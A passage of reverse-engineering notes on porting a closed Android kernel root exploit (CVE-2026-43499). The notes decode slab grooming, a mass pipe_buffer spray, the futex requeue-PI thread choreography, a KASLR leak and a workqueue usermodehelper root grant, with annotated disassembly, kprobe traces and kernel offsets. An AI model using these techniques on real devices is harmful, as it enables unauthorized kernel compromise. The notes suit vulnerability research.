substitution ALSO collided a stack canary slot with an unrelated local
in a nearby function this same session -- `getrlimit`/`setrlimit` in
`fcn.000044f4` -- costing real time until caught). Re-read the ENTIRE
1356-byte function from raw disassembly with `e asm.varsub=false` (no
variable-name substitution at all, only true register/stack-offset
values), correcting two real misunderstandings from the earlier pass:

**Full, now-accurate structure**:
1. **Two loops of 240 iterations each** (not two single calls, as
   earlier misread) create **480 pipes total**, each immediately sized
   to 2 pages via `FUN_00107d18` (`pipe(fd); fcntl(fd, F_SETPIPE_SZ,
   2<<12)`), stored into the same `DAT_0010db68`/`DAT_0010e2e8` fd-pair
   arrays that `FUN_00108320`'s cleanup function closes 240+240 of.
2. `fork()`s. **Parent**: records the child pid into `DAT_0010d714`
   (what `FUN_00108320`'s `kill(DAT_0010d714,9)` targets on a retry),
   closes its own copies of all 480 pipes (harmless -- the child's
   independent fd-table copies, inherited by `fork()`, keep the
   underlying pipe objects alive), waits for an 8-byte "ready" signal
   from the child over a plain sync pipe, then returns.
3. **Child**: `prctl(PR_SET_PDEATHSIG)`, then runs this project's
   already-proven `groom.c`-equivalent mm_struct grooming choreography
   verbatim -- same 4 tiers (1024/192/31/32, via `fcn.00007ca8` =
   `calloc`-pair array init, confirmed identical to `groom.c`'s own
   sizing), same `FUN_00106178` fork+`/proc/pid/mem`+kill primitive per
   child (this is `groom.c`'s `clone_child()`+`open_memfd()`+
   `kill_child()`, fused into one call, run sequentially rather than
   batched -- functionally equivalent), same leak call
   (`fcn.00005348`/`fcn.00005354`, matching `kernelsnitch_setup`/
   `kernelsnitch_bruteforce`'s role), same `malloc(0x8e80)` skb buffer
   (only difference from `groom.c`: filled with `0x50` here vs `0x41`
   in `groom.c` -- almost certainly irrelevant, the kernel never reads
   spray padding content), same two `socketpair()`s, same
   `sendmsg()`/`sched_yield()×4`/tiered-close staging, same final
   `sendmsg()` reclaim send. **This confirms `groom.c` is a faithful,
   already-proven port of exactly this choreography** -- nothing new
   to fix there.
4. **The new part, not previously understood**: immediately after the
   leak/reclaim succeeds and the page-aligned address is computed
   (`x20 = leaked & 0xffffffffffff8000`, i.e. `leaked & ~(0x8000-1)` --
   byte-for-byte the same masking `groom.c`'s own
   `base = leaked & ~(ORDER3_SIZE-1)` already does), **all 480 pipes
   from step 1 get resized from 2 pages to 32 pages each** via
   `FUN_00107d50` (`fcntl(fd, F_SETPIPE_SZ, 32<<12)`), in the same two
   240-iteration loop shape. A `pipe_buffer[]` resize forces the kernel
   to `kcalloc()` a brand-new, larger backing array and free the old
   one -- doing this to 480 pipes simultaneously, right after freeing
   the `mm_struct` slab page, is a **mass-spray-for-the-same-physical-
   page** technique: much larger in scale (480 reallocating pipes,
   ~62MB of `pipe_buffer` arrays being freed+reallocated at once) than
   `FUN_00108604`'s later, precisely-targeted 16-slot spray (which
   presumably runs against whichever specific page this mass spray
   happened to win). After the resize, cleans up the grooming tier
   contexts (same `fcn.0000605c`/`fcn.000060b4` helpers as
   `FUN_001060e8`), frees the skb buffer, closes all 480 pipes again,
   then `write()`s the computed aligned address back to the **parent**
   over the plain sync pipe, and the child settles into an infinite
   `sleep(60)` loop (presumably holding some other state alive in the
   background, or simply because its job -- getting a favorable page
   reclaimed and reporting the address -- is done).

**Practical implication**: `FUN_00107dd4`'s job is to produce ONE
page-aligned address (via the exact same leak/mask math `groom.c`
already implements) with a MUCH stronger statistical guarantee that a
480-pipe-sized physical-memory footprint is also contending for
reuse of that same freed page range -- porting this properly means
adding the 480-pipe pre-creation-then-resize spray around a
groom.c-equivalent leak step, not a wholly separate technique. This is
a real, substantial addition (480 pipes × 2 fds + later 32-page
buffers is nontrivial fd/memory pressure -- the `RLIMIT_NOFILE`/
`RLIMIT_MEMLOCK` raise added this session becomes directly relevant
here too) but is now understood well enough to plan an implementation,
unlike before this pass. **Not implemented this session** -- large,
novel, and every past attempt at porting kernel-touching code in this
project without on-device iteration has been treated as unsafe to ship
untested; the device was disconnected for this entire investigation.

## Capstone finding: how `FUN_00107dd4`'s early leak connects to `FUN_00108808` (2026-09-17, same unattended session)

Traced `FUN_00107dd4`'s only call site (`r2 -qc "axt fcn.00007dd4"`,
one xref): `fcn.000044f4` (this project's `app_main()` equivalent),
raw vaddr `0x4774`, called early (in the same region as the initial
KASLR-locate stage, before any futex/waiter threads spawn). Its return
value (the parent branch's `x0`, loaded from the byte read over the
sync pipe -- i.e. the child's computed `leaked & ~(0x8000-1)`
page-aligned address, same math as `groom.c`'s own `payload_base`) gets
stored into `DAT_0010dae0` (`str x0, [x23, 0xae0]`, `x23 = adrp
0xd000` -> raw address `0xdae0`).

**This is exactly the flag `FUN_00108808` checks first**: its very
first real instruction after the prologue is `ldr x8, [x26, 0xae0];
cbz x8, 0x8a24` (already read earlier this session, previously
undated to a concrete source) -- if `DAT_0010dae0` is non-zero (the
early 480-pipe leak succeeded), `FUN_00108808` uses it directly as the
base for its struct-page scan; if zero, it falls through to the
alternate path at raw vaddr `0x8a24` (a busy-wait/retry loop, already
read earlier, previously unexplained).

**Combined with the `DAT_0010daa0` finding below**: `FUN_00108320`'s
cleanup-between-retries resets BOTH `DAT_0010dae0 = 0` and
`DAT_0010daa0 = 0` (same line block, decompile ~line 4280-4281), and
`FUN_00107dd4` is called exactly once, ever, from `fcn.000044f4`
(never re-called from inside the retry loop). So: **only the FIRST of
the up-to-12 attempts inside `FUN_001076c0`'s retry loop can use the
fast path seeded by the early 480-pipe leak** -- every subsequent
retry has `DAT_0010dae0` reset to 0 and must fall through
`FUN_00108808`'s alternate branch (raw vaddr `0x8a24` onward, not
fully decoded this session) instead. This is a sensible, deliberate
design (expensive 480-pipe leak done once up front for the common
case; cheaper fallback logic for retries) — not an oversight, and not
something this project's own port needs to route around: since the
port doesn't yet reach `FUN_00108808` at all (blocked further
upstream), which of its two branches would eventually matter is not
yet a live concern.

## Confirmed: `DAT_0010daa0` (AAR/AAW "already established" flag) is reset every attempt, never persists

Directly resolves whether `root_umh.c`'s substitution of the simple
ashmem-based primitive for the real pipe_buffer-based one is viable
long-term. It is not -- see `oss-clone-afzh3/STATUS.md`'s "CORRECTION
to items 5/3" section for the full writeup (kept there to avoid
duplicating the same evidence in two places): `FUN_00108320` resets
`DAT_0010daa0 = 0` before every retry, it starts at 0 on the very first
attempt too, and the ONLY place it is ever set non-zero is inside
`FUN_00108808` itself, upon completing its own slab-identification +
pipe_buffer verification work. `FUN_001076c0`'s simple ashmem self-test
never touches it. So `FUN_001086e0`/`FUN_00108774` (what `FUN_00108fa4`'s
real read/write calls go through) will always take the pipe_buffer
establishment path -- the simple primitive this project built in
`aar_aaw.c` is never actually sufficient on its own for the real
root-grant step, only for `FUN_001076c0`'s own light self-test.

## Realistic scope assessment (2026-09-17)

The closed binary's post-corruption phase (`FUN_001076c0` onward) is
substantially larger and more sophisticated than initially assumed:
it is not one AAR/AAW primitive but at least two (ashmem/configfs
confused-deputy for the light self-test; pipe_buffer fake-object +
direct struct-page slab identification for the real workqueue-hijack
root grant), the second of which alone spans an estimated 5000+ bytes
across `FUN_00107dd4`/`FUN_00108604`/`FUN_001086e0`/`FUN_00108774`/
`FUN_00108808`/`FUN_00108fa4` plus a cluster of BOLT-fragmented shared
trampolines with no clean function boundaries
(`FUN_00108eec`..`FUN_00108f98`). Fully hand-porting this to the same
byte-exact, twice-verified standard as `groom.c`/`fops_install.c`/
`futex_trigger.c` (which ARE complete and on-device tested, 8/9 clean)
is a multi-session-scale task, not a same-session continuation.
`oss-clone-afzh3/src/root_umh.c` remains a verified-equivalent-purpose
substitute (confirmed via exact `target.h` offset matches inside
`FUN_00108fa4`'s decompile) rather than a literal port of this
subsystem.

`oss-clone-afzh3/src/root_umh.c` currently substitutes a
verified-equivalent-purpose (same `CALL_USERMODEHELPER_EXEC_WORK_OFF`/
`SYSTEM_UNBOUND_WQ_OFF`/`WQ_DFL_PWQ_OFF`/etc. `target.h` constants,
cross-confirmed via exact hex match inside `FUN_00108fa4`'s decompile)
but structurally DIFFERENT implementation: it reuses this project's own
already-offset-verified `src/root.c:install_workqueue_umh_root()`
logic on top of the SIMPLE ashmem-based primitive from `aar_aaw.c`,
not the closed binary's pipe_buffer primitive. Not yet proven to work
end-to-end (blocked on the ashmem primitive's `EINVAL`s above).

## v3 second-order-deadlock kprobe trace: full decode (2026-09-17, device disconnected)

`test_root_v3` fired once on-device (see `oss-clone-afzh3/STATUS.md`
for the raw output and the hypothesis it tested) right before the
device was disconnected for the night. This is the follow-up decode of
the kprobe trace it produced, done statically (hex conversion + cross-
referencing addresses against each other and against that run's
`payload_base`), continuing the user's explicit instruction to keep
investigating without the device connected.

Raw trace (already captured in the prior session, reproduced here for
the derivation):

```
test_root_v3-15066 [001] p_take: task=0xffffff89f5d45a00 waiter=0x0 pi_blocked_on=0
test_root_v3-21221 [006] p_take: task=0xffffff89f5d43600 waiter=0x0 pi_blocked_on=0
test_root_v3-21221 [006] p_chain: task=0xffffff89f5d45a00 waiter=0xffffffc05a363b38 pi_blocked_on=18446743800382536520
test_root_v3-21221 [006] p_take: task=0xffffff89f5d43600 waiter=0xffffffc05a363b38 pi_blocked_on=18446743800345148216
test_root_v3-21221 [006] p_remove: waiter=0xffffffc05a363b38 wtask=18446743566732768768 wpi_parent=1
test_root_v3-21221 [006] p_chain: task=0xffffff89f5d45a00 waiter=0x0 pi_blocked_on=18446743800382536520
test_root_v3-21222 [003] p_take: task=0xffffff89f5d45a00 waiter=0xffffffc05c70bb48 pi_blocked_on=18446743800382536520
test_root_v3-21222 [003] p_take: task=0xffffff89f5d45a00 waiter=0xffffffc05c70bb48 pi_blocked_on=18446743800382536520
test_root_v3-21222 [003] p_remove: waiter=0xffffffc05c70bb48 wtask=18446743566732777984 wpi_parent=1
```

(`test_root_v3`'s own stderr confirmed tid 21221 = owner thread, tid
21222 = waiter thread, from the earlier `sched_setattr tid=21222` and
`[futex-v3] owner attempting second lock` log lines.)

Hex conversions (`python3 -c "print(hex(N))"`):

```
18446743800382536520 = 0xffffffc05c70bb48
18446743800345148216 = 0xffffffc05a363b38
18446743566732768768 = 0xffffff89f5d43600
18446743566732777984 = 0xffffff89f5d45a00
```

Self-consistency check (every value cross-referenced against every
other value in the same trace, not assumed):

- `task=0xffffff89f5d45a00`'s `pi_blocked_on` is
  `0xffffffc05c70bb48` in both places it appears. That address is
  *exactly* the `waiter=` value tid 21222 (waiter thread) reports for
  itself in its own two `p_take` lines. So `0xffffff89f5d45a00` is the
  **waiter's own `task_struct`**, and its `pi_blocked_on` genuinely
  points at its **own real, stack-local `rt_waiter`** — fully
  self-consistent, real kernel state.
- `task=0xffffff89f5d43600` is the other task pointer, tied to
  `waiter=0xffffffc05a363b38` — and `wtask=18446743566732768768` from
  the very next line (`p_remove`) converts to exactly
  `0xffffff89f5d43600` too. So this is the **owner's own `task_struct`**
  (confirmed independently via the `p_take` at 11516.217411, the first
  event tid 21221 generates), and `waiter=0xffffffc05a363b38` is the
  **owner's own `rt_waiter`** from its plain (non-proxy) `LOCK_PI` call
  — ordinary `FUTEX_LOCK_PI` also allocates its waiter on the caller's
  stack, so this is exactly as expected, not evidence of anything
  shared/corrupted.
- `wtask=18446743566732777984` (second `p_remove`, for tid 21222)
  converts to `0xffffff89f5d45a00` — the waiter's own task pointer
  again, self-consistent with the first bullet.

**Conclusion**: `rt_mutex_adjust_prio_chain` firing at all (twice, for
the owner thread) is a first in this project's testing history, and
does confirm the v3 hypothesis that the owner's second, later-timed
`LOCK_PI(f_pi_chain)` collision reaches the kernel's actual
deadlock-cycle-detection walk. But every single object it touched —
both task pointers, both waiter pointers — is fully real, fully
self-consistent, and nowhere near that run's `payload_base` (printed as
`ffffff8819e97000`). Same conclusion as `v2`: reaching real, deep
`rt_mutex` code is necessary but not sufficient; nothing this project
has built so far has actually substituted or corrupted any of the
structures the chain-walk operates on. See `STATUS.md`'s "Fresh
from-scratch re-disassembly session" for what this negative result
motivated next (re-verifying the whole dance against the real binary
byte-for-byte, independent of any specific timing hypothesis) and the
four concrete discrepancies that re-verification found.

## Fresh re-disassembly: exact addresses and byte evidence (2026-09-17)

Full narrative and conclusions are in `STATUS.md`; this section keeps
the raw, checkable evidence (exact addresses, exact bytes, exact
register traces) for future reference, in the same style as every
other disassembly section in this file.

Binary: `RootMyGalaxyDesktop/assets/cve-2026-43499-app-afzh3.so`
(ELF64 PIE, ARM64, NDK r28c/13676358, Android API 35, not stripped).
r2 6.2.0 renamed `asm.varsub` → `asm.sub.var` (same purpose: disable
misleading variable-name substitution); confirmed by `e??` listing all
current `asm.sub.*`/`asm.var*` eval vars when the old name errored.

**Function identity cross-check** (establishes the
`Ghidra_FUN_addr = raw_r2_vaddr + 0x100000` convention still holds for
this exact file): `fcn.00003e18`'s raw r2 address, unprompted, exactly
equals `FUN_00103e18 - 0x100000`. Confirmed by symbol content, not just
address arithmetic — this function's first syscall is `gettid()`
(`mov w0,0xb2 /* 178 decimal, __NR_gettid arm64 */; bl sym.imp.syscall`
at raw vaddr 0x3e4c), matching this project's long-standing
identification of `FUN_00103e18` as the waiter thread.

**`sub.syscall` vs `sym.imp.syscall`**: r2 auto-named TWO distinct call
targets. `sym.imp.syscall` is the raw libc import (`x0`=syscall number,
e.g. `gettid`/`tgkill`/`clock_gettime`-adjacent raw calls use it
directly). `sub.syscall` (raw vaddr 0x4918 region trampoline chain) is
a **local futex-specific wrapper** taking `(uaddr, op, val, timeout,
uaddr2, val3)` directly (no explicit syscall-number arg — it hardcodes
`SYS_futex`/98 internally before tail-calling the real syscall). Found
by tracing `fcn.00004918` (called immediately before most `sub.syscall`
sites): it only zeroes `x2..x5` and returns, leaving `x0`(uaddr)/`w1`
(op) untouched — meaningless unless `sub.syscall` itself treats `x0` as
uaddr, not as a syscall number. Confirmed the theory by checking every
`sub.syscall` xref's register setup: all six sites (three in the
waiter, two in the owner, one in app_main) consistently set up
`(uaddr, op, val, timeout, uaddr2, val3)` in `x0..x5`, never a raw
syscall number.

**Waiter, `fcn.00003e18` (== `FUN_00103e18`), annotated key addresses**
(`G` = `.data`+0xd000 throughout this section):

```
0x3e24  mov w0, 3                    ; pin_to_cpu(3) arg
0x3e44  bl  fcn.000041f0             ; sched_setaffinity wrapper
0x3e48  mov w0, 0xb2                 ; __NR_gettid
0x3e4c  bl  sym.imp.syscall
0x3e5c  stlr w0, [G+0x730]           ; cache own tid
0x3e84  bl  sym.imp.sigemptyset
0x3e94  bl  sym.imp.sigaction        ; SIGUSR1 (sig=0xa) handler install
0x3e9c  add x0, x0, 0x738            ; uaddr = G+0x738 = f_pi_chain
0x3ea4  mov w1, 6                    ; FUTEX_LOCK_PI
0x3ea8  bl  fcn.00004918             ; zero val/timeout/uaddr2/val3
0x3eac  bl  sub.syscall              ; futex(f_pi_chain, LOCK_PI)
0x3eb0  cbnz x0, 0x41e4              ; error path if nonzero
0x3ebc  stlr w9(=1), [G+0x73c]       ; waiter_ready = 1
0x3ecc  cbnz [G+0x740], 0x3ee4       ; skip wait loop if owner_started already set
0x3ed8  bl  sub.usleep               ; \_ poll loop: wait for owner_started
0x3edc  ldar w8, [G+0x740]           ; /
0x3ee4  bl  sym.imp.clock_gettime    ; build WAIT_REQUEUE_PI timeout
0x3f04  add x20, x20, 0x744          ; x20 = G+0x744 (timeout/futex-word block base)
0x3f08  x0 = x20+4 = G+0x748         ; uaddr1 = f_wait
0x3f14  x4 = x20+8 = G+0x74c         ; uaddr2 = f_pi_target
0x3f18  mov w1, 0xb                  ; FUTEX_WAIT_REQUEUE_PI = 11
0x3f2c  bl  sub.syscall              ; futex(f_wait, WAIT_REQUEUE_PI, 0, &ts, f_pi_target, 0)
...
0x3fa0  ldar w8, [G+0x754]           ; gate: only build+fire SIGUSR1 if this is set
0x3fa4  cbz  w8, 0x4164              ; (this project's waiter_ok/ETIMEDOUT gate — matches)
0x3fe4..0x40d4                       ; build FPSIMD payload (fcn.00005e18/0x492c helpers,
                                      ; matches sigusr1_payload.c's field layout exactly),
                                      ; then getpid()+gettid()+tgkill(pid,tid,SIGUSR1=0xa)
0x4164  add x19, x19, 0x734          ; x19 = G+0x734 (base for f_pi_chain via +4)
0x417c  add x0, x19, 4               ; uaddr = G+0x738 = f_pi_chain (again)
0x417c  mov w1, 7                    ; FUTEX_UNLOCK_PI
0x4190  bl  sub.syscall              ; futex(f_pi_chain, UNLOCK_PI)
```

**Owner, `fcn.00004274` (== `FUN_00104274`), full body (140 bytes,
raw vaddr 0x4274-0x42fc)** — confirmed spawned via
`adr x2, fcn.00004274` at raw vaddr 0x46c0, second of app_main's three
`pthread_create` calls:

```
0x4278  add x0, x0, 0x74c            ; uaddr = G+0x74c = f_pi_target
0x4280  mov w1, 6                    ; FUTEX_LOCK_PI
0x4298  bl  sub.syscall              ; futex(f_pi_target, LOCK_PI)
0x429c  cbnz x0, 0x42f8              ; error -> fwrite+exit
0x42a8  ldar w8, [G+0x73c]           ; \_ poll loop: wait for waiter_ready
0x42b0  bl  sub.usleep               ; /
0x42c0  mov w20, 1
0x42c4  add x8, x19, 8               ; x8 = G+0x738+8 = G+0x740 = owner_started
0x42dc  stlr w20, [x8]               ; owner_started = 1  (BEFORE the 2nd lock attempt)
0x42c8  mov x0, x19                  ; uaddr = G+0x738 = f_pi_chain
0x42cc  mov w1, 6                    ; FUTEX_LOCK_PI (second lock, no gate)
0x42e0  bl  sub.syscall              ; futex(f_pi_chain, LOCK_PI) -- return value NEVER checked
0x42e4  add x8, x19, 0x20            ; x8 = G+0x738+0x20 = G+0x758 = owner_acquired
0x42e8  stlr w20, [x8]               ; owner_acquired = 1 unconditionally
0x42ec  mov w0, 1; bl sym.imp.sleep; b 0x42ec   ; sleep(1) forever
```

This exactly matches `run_futex_trigger_cb`'s original
`owner_thread_fn`, confirming (independently, from scratch) that the
deadlock this project spent most of the session working around is
inherent to the real dance run in isolation, not a reproduction bug.

**app_main, `fcn.000044f4` (== `FUN_001044f4`), relevant excerpts:**

```
0x4580  mov x0, xzr                  ; cpu=0
0x4584  bl  fcn.000041f0             ; app_main pins ITSELF to CPU 0
0x4600  mov w0, wzr; bl fcn.00006fa4 ; (unrelated setup, not traced further)
0x4624  adr x2, fcn.00003e18         ; \
0x46a8  bl  sym.imp.pthread_create   ; / spawn WAITER (1st of 3 threads)
0x46b8  adr x2, fcn.00004274         ; \
0x46c0  bl  sub.pthread_create       ; / spawn OWNER (2nd of 3 threads)
0x46d0  adr x2, fcn.00004300         ; \
0x46??  bl  pthread_create           ; / spawn CONSUMER (3rd of 3 threads) -- NEW finding,
                                      ;   never spawned/reproduced by this project before
0x46f4  ldar w8, [G+0x730]           ; \_ wait for (waiter_tid_g != 0)
0x46f8  cbz  w8, 0x4704              ; /   OR (owner_started != 0) -- NOT
0x46fc  ldar w8, [G+0x740]           ;     "waiter_waiting AND owner_started" like v1-v3 port
0x470c  mov w0, 0x86a0; movk w0,1,lsl16  ; 0x186a0 = 100000
0x4714  bl  sym.imp.usleep           ; usleep(100000) -- 100ms, NEVER ported before v4
0x4728  x0 = G+0x734+0x14 = G+0x748  ; uaddr1 = f_wait
0x472c  x4 = G+0x734+0x18 = G+0x74c  ; uaddr2 = f_pi_target
0x4730  mov w1, 0xc                  ; FUTEX_CMP_REQUEUE_PI = 12
0x4734  mov w2, 1                    ; val (nr_wake) = 1
0x4738  mov w3, 1                    ; nr_requeue (as void*) = 1
0x473c  mov w5, wzr                  ; val3 = 0
0x4744  bl  sub.syscall              ; futex(f_wait, CMP_REQUEUE_PI, 1, (void*)1, f_pi_target, 0)
                                      ; return value in x0 is NEVER checked/branched on here
```

**Consumer, `fcn.00004300` (== `FUN_00104300`), relevant excerpts** —
the ONLY function in the whole binary that calls `fcn.000056a8`
(`sched_setattr` wrapper), confirmed via a full-binary xref search:

```
0x4304  mov w0, 1
0x4324  bl  fcn.000041f0             ; pin_to_cpu(1) -- consumer's own CPU pin, NOT app_main's
0x4330  ldar w8, [G+0x764]           ; abort flag, read once
0x4334  cbnz w8, 0x44d4              ; bail immediately if already set
0x4360  ldar w20, [G+0x76c]          ; "attempt id" -- outer-supervisor state, see below
...loop waiting for w20 to differ from the reference value latched at 0x4330...
0x43ac  w22 = ldar [G+0x730]         ; waiter's cached tid (target of sched_setattr)
0x43bc  w28 = (w20 - 1) % 8          ; per-attempt index, NOT env-var based this time
0x4420  atoi(getenv("S23_SUPERVISOR_ATTEMPT"))  ; SEPARATE index, used only for the
0x4438  ldr x8, [0x2240 + idx*8]     ; cycle-delay table lookup (already correctly ported)
0x4488  add w1, w28, 0x13            ; nice_value = ((attempt-1) % 8) + 19
0x448c  mov w0, w22                  ; tid = cached waiter tid
0x4494  bl  fcn.000056a8             ; sched_setattr wrapper call
```

**`fcn.000056a8` (`sched_setattr` wrapper) attr construction:**
`.rodata`+0x22c0 raw bytes `30 00 00 00 03 00 00 00`, loaded as one
8-byte `ldr d1,[x10,0x2c0]` and stored to `attr`+0 covering both
`size`(u32) and `sched_policy`(u32) fields at once: `size=0x30`(48),
`sched_policy=3`(SCHED_BATCH). `nice` field written separately from the
caller's `w1` arg at the correct struct offset (0x10). All other
`sched_attr` fields explicitly zeroed (`flags`, `priority`, `runtime`,
`deadline`, `period`).

**Outer-supervisor globals, searched and NOT found written anywhere in
this binary** (full-binary grep of a linear `pD` disassembly dump for
every literal offset, not just likely call sites): `G+0x734` (app_main's
own gate before its dead re-leak retry loop), `G+0x76c` (consumer's
"attempt id"), `G+0x770`/`G+0x774` (the re-leak request/ack pair —
`fcn.00003d40`, an atomic test-and-clear helper, is app_main's ONLY
reader; nothing ever writes 1 to `G+0x770`, so that branch, and its
call to the already-known `fcn.00007dd4` pipe-leak function, is dead in
this build). Judged consistent with this project's own already-existing
multi-process `S23_SUPERVISOR_ATTEMPT` retry harness owning these
globals from a separate process/attempt, not anything inside a single
exploit attempt — not chased further this session.

## BTF ground-truth check: `task_struct` PI fields (2026-09-17)

This local BTF file (`docs/kernel-reference/btf/vmlinux-SAFZH3-5.15.189.btf`
— this device's own real kernel, not a generic/guessed one) can be
queried directly with `pahole -C <struct> <btf-file>` (`pahole` is
already installed on this machine, `/usr/bin/pahole`). Used it to
double-check the one kprobe field-fetch offset this whole session's
kprobe oracle work has depended on (every `pi_blocked_on=+0x8b0(%xN)`
fetch, all the way back to the original NULL-deref bug hunt):

```
struct task_struct {
        ...
        raw_spinlock_t             pi_lock;              /*  2180     4 */
        ...
        struct rb_root_cached      pi_waiters;           /*  2200    16 */
        struct task_struct *       pi_top_task;          /*  2216     8 */
        struct rt_mutex_waiter *   pi_blocked_on;        /*  2224     8 */
```

`2224` decimal = `0x8b0` exactly — confirms every `pi_blocked_on`
reading taken this session (NULL-deref hunt, v2, v3) used the right
offset. Also recorded here for future probes on this exact kernel:
`pi_lock`=+0x884, `pi_waiters`=+0x898, `pi_top_task`=+0x8a8.

## Waiter's real post-SIGUSR1 handoff protocol, decoded in full: G+0x76c/G+0x750, and the G+0x760 gate that never opens (2026-09-18)

Per direct instruction to find the exact corruption-landing mechanism
by reading the closed binary's assembly and reproduce it, did fresh
raw r2 disasm (`asm.sub.var=false`) of the byte range the "Further
trace of FUN_00103e18" section above had NOT yet covered: raw vaddr
`0x40d4`-`0x4164` (waiter, right after the SIGUSR1 `tgkill`) and
`0x4494`-`0x44bc` (consumer, right after `sched_setattr`). Binary:
`RootMyGalaxyDesktop/assets/cve-2026-43499-app-afzh3.so` (same file as
every other section in this doc; `sha256sum` re-checked this session,
unchanged: `84f9b354c03766c226fdc2c072215649432bb8ec6d8c8570ea58cef
837771da3`).

**Exact sequence, byte-verified**:

```
0x40d4  bl  sym.imp.syscall            ; tgkill(pid, tid, SIGUSR1) returns
0x40d8  ldar w8, [x23]                 ; x23 = G+0x72c (set at 0x3fec); w8 = SIGUSR1 handler's own completion flag
0x40dc  cbnz x0, 0x4158                ; tgkill itself failed -> skip everything, go straight to cleanup
0x40e0  cmp w8, 1
0x40e4  b.ne 0x4158                    ; handler flag != 1 -> same skip
0x40e8..0x40fc                         ; x8 = G+0x750, x9 = G+0x750+0x1c = G+0x76c
                                        ; stlr w10(=1), [x9]   => *(G+0x76c) = 1   <-- RELEASES CONSUMER
0x4100  ldar w9, [x8]                  ; *(G+0x750) -- consumer's "done" flag
0x4104  cbnz w9, 0x412c                ; already done? skip the spin
0x4108..0x4128                         ; yield-spin loop, cap w10=0x3b9ac9ff (999,999,999 -- ~1s worth
                                        ; of iterations, NOT a real 1s deadline; this project's port uses
                                        ; a real CLOCK_MONOTONIC 1s bound instead, functionally equivalent)
                                        ; re-checks *(G+0x750) via ldar w11,[x8] every iteration (0x4118)
0x412c..0x4138                         ; x8 = G+0x75c, x9 = x8+0x10 = G+0x76c; stlr wzr,[x9] => *(G+0x76c) = 0
0x413c  add x9, x8, 4                  ; x9 = G+0x760  <-- THE GATE COUNTER
0x4140  ldar wzr, [x8]                 ; dummy read of *(G+0x75c), result discarded (barrier only)
0x4144  ldar w8, [x9]                  ; w8 = *(G+0x760)
0x4148  cmp w8, 1
0x414c  b.lt 0x4164                    ; counter < 1 -> skip verify, go straight to UNLOCK_PI
0x4150  bl  fcn.000076c0               ; counter >= 1 -> call the "stage=verifying-kernel-access" AAR/AAW self-test
0x4154  b   0x4164
0x4164..                               ; FUTEX_UNLOCK_PI(f_pi_chain) via fcn.00004918+sub.syscall
```

**Consumer, `fcn.00004300` (`FUN_00104300`) right after `sched_setattr`**
(raw vaddr `0x4494`-`0x44bc`, already partly quoted above for the
`sched_setattr` call site itself):

```
0x4494  bl  fcn.000056a8               ; sched_setattr(tid=waiter, nice, SCHED_BATCH)
0x4498  cbnz x0, 0x44ac                ; on failure only: log-error helper call with &(G+0x760) as an argument
                                        ;   (0x449c-0x44a8) -- the ONLY other static xref to the G+0x760
                                        ;   region found anywhere in the binary, and it's on the FAILURE path
0x44ac  adrp/add x8, G+0x750
0x44b4  stlr w23, [x8]                 ; *(G+0x750) = w23  <-- THE SIGNAL the waiter's spin (0x4100/0x4118) waits for
0x44b8  add x8, x8, 0x1c               ; x8 = G+0x76c
0x44bc  stlr wzr, [x8]                 ; *(G+0x76c) = 0    <-- consumer also clears the release flag
```

**Full xref search for every write to `G+0x760`** (`r2 -c "axt @ 0xd760"`,
whole binary, both statically-resolved offset arithmetic AND every
`add reg,reg,imm` chain r2 could trace): exactly 3 hits --
`fcn.00003e18@0x3f50` (waiter's OWN pre-wait cleanup, zeroes it: part
of the 0x3f30-0x3f68 block that also zeroes `f_wait`/`f_pi_target`
siblings right after `FUTEX_WAIT_REQUEUE_PI` returns, confirmed `x20 =
G+0x744`, so `x20+0x1c = G+0x760`), `fcn.00004300@0x44a4` (the
failure-path log-helper argument above, not a direct write to the
counter itself -- `fcn.00003650`'s own body was not traced this
session, so whether it internally writes something nonzero into the
pointer it's given is not yet ruled out, but this only happens on
`sched_setattr` FAILURE, and every run this project has fired reports
`sched_setattr ret=0` / `errno=35`(EBUSY, non-fatal per the wrapper's
own `cbnz x0,0x44ac` gate on the syscall's raw return value being
exactly 0) success), and `fcn.000044f4@0x4678` (`app_main`'s own
init-time zero, confirmed `x9 = G+0x730`, so `x9+0x30 = G+0x760`).
**No write of a nonzero value to `G+0x760` was found anywhere r2 could
resolve statically.** Combined with `fcn.000076c0` having exactly ONE
call site in the entire binary (this gated one, confirmed via
`axt @ fcn.000076c0`) and `fcn.00004300` having exactly one caller
(`app_main`'s `pthread_create`, confirmed via `axt @ fcn.00004300`):
**as far as this session's static analysis can tell, the real waiter
thread never calls the verify/AAR-AAW self-test from this call site —
it always takes the `b.lt 0x4164` branch straight to `UNLOCK_PI`.**
Whatever establishes the real kernel-RW capability this project has
observed the closed binary actually succeed with (`temporary-root-ready`
via `ksu-payload`, same underlying `.so`, this session) must do so from
a call site this session has not located — plausibly inside the
BOLT-fragmented `FUN_00108eec`-`FUN_00108f98` trampoline cluster, or
from `app_main` itself after all three threads join, neither
decoded this session.

**Practical port decision made from this evidence**: `oss-clone-afzh3`'s
`v10` futex-trigger variant (see `STATUS.md`, "v10: real SIGUSR1
handoff protocol, no landing confirmed") stopped calling its
verify+root_umh callback from inside the waiter thread (matching the
gate never opening) and instead calls it once, from the outer
`run_futex_trigger_v10_cb()`, after the whole thread routine returns.
This is the most literal port of "the gate is always closed here" this
session could justify without inventing a new, unconfirmed call site.

## KASLR slide alignment bug: this kernel randomizes in 32KB steps, not 64KB (2026-09-18)

`src/kaslr.c`'s tracefs-leak candidate filter required
`(candidate & 0xffffULL) == 0` (a 64KB/`0x10000` alignment) before
accepting a `worker_thread` caller match. This was silently wrong.
Real `/proc/kallsyms _text` readings taken THIS session, across 6
different boots (`su`+`echo 0 > kptr_restrict`+`grep " _text$"`,
kernel_base minus `KIMAGE_TEXT_BASE=0xffffffc008000000`):

| boot | kernel_base | slide | `slide / 0x8000` | `slide / 0x10000` |
|---|---|---|---|---|
| (pre-manual-reboot, several runs) | `...c0080a0000` | `0xa0000` | 20 | 10 |
| post-reboot #1 | `...c008028000` | `0x28000` | 5 | 2.5 |
| post-reboot #2 | `...c008020000` | `0x20000` | 4 | 2 |
| post-reboot #3 (tracefs leak, `found=1`) | `...c008140000` | `0x140000` | 40 | 20 |
| post-reboot #4 | `...c0080b8000` | `0xb8000` | 23 | 11.5 |
| post-reboot #5 (tracefs leak, `found=1`, post-fix) | `...c008058000` | `0x58000` | 11 | 5.5 |

**All 6 are exact multiples of `0x8000` (32KB). Only 4 of 6 are also
multiples of `0x10000` (64KB)** -- the other 2 (`0x28000`, `0xb8000`)
are odd 32KB multiples, and the OLD 64KB-aligned filter would reject a
genuine, correct `worker_thread` caller match on any boot landing on
one of those. This exactly explains a real, reproducible symptom this
session hit repeatedly: `kaslr_locate_via_tracefs()` failing with
